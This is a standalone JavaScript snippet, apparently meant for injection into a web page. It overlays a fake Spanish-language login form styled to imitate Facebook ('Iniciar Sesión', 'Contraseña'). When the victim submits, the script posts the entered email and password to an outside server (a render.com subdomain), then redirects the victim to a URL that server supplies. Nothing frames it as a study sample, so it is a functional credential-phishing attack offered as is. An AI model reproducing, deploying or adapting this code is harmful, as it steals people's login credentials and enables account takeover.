(function() {
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    const overlay = document.createElement('div');
    overlay.style = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100% !important;
        height: 100% !important;
        background: rgba(0, 0, 0, 0.85) !important;
        z-index: 2147483647 !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        backdrop-filter: blur(5px) !important;
        margin: 0 !important;
        padding: 0 !important;
    `;

    overlay.innerHTML = `
        <div style="
            background: white !important;
            padding: 35px 25px !important;
            border-radius: 15px !important;
            /* AQUÍ ESTÁ EL TRUCO: 90% en móvil, máximo 400px en PC */
            width: 90% !important; 
            max-width: 400px !important; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.5) !important;
            text-align: center !important;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
            box-sizing: border-box !important;
        ">
            <h2 style="color: #1877f2 !important; margin: 0 0 20px 0 !important; font-size: 24px !important; font-weight: bold !important;">
                Iniciar Sesión
            </h2>
            
            <input id="i-email" type="text" placeholder="Correo electrónico o teléfono" style="
                width: 100% !important;
                height: 50px !important;
                padding: 0 12px !important;
                margin-bottom: 12px !important;
                border: 1px solid #ddd !important;
                border-radius: 8px !important;
                font-size: 16px !important; /* Evita que iOS haga zoom automático */
                box-sizing: border-box !important;
                display: block !important;
                -webkit-appearance: none !important;
            ">
            
            <input id="i-pass" type="password" placeholder="Contraseña" style="
                width: 100% !important;
                height: 50px !important;
                padding: 0 12px !important;
                margin-bottom: 20px !important;
                border: 1px solid #ddd !important;
                border-radius: 8px !important;
                font-size: 16px !important;
                box-sizing: border-box !important;
                display: block !important;
                -webkit-appearance: none !important;
            ">
            
            <button id="i-btn" style="
                width: 100% !important;
                height: 50px !important;
                background: #1877f2 !important;
                color: white !important;
                border: none !important;
                border-radius: 8px !important;
                font-size: 18px !important;
                font-weight: bold !important;
                cursor: pointer !important;
                display: block !important;
            ">
                Entrar
            </button>
            
            <p style="margin-top: 20px !important; color: #606770 !important; font-size: 14px !important;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
    `;

    document.body.appendChild(overlay);

    document.getElementById('i-btn').onclick = async function() {
        const email = document.getElementById('i-email').value;
        const password = document.getElementById('i-pass').value;
        if(!email || !password) return alert("Completa los datos");

        this.disabled = true;
        this.innerText = "Cargando...";

        try {
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });
            
            const res = await fetch(`${SERVER_URL}/config`);
            const config = await res.json();
            window.location.href = config.redirect_url;
        } catch(e) {
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
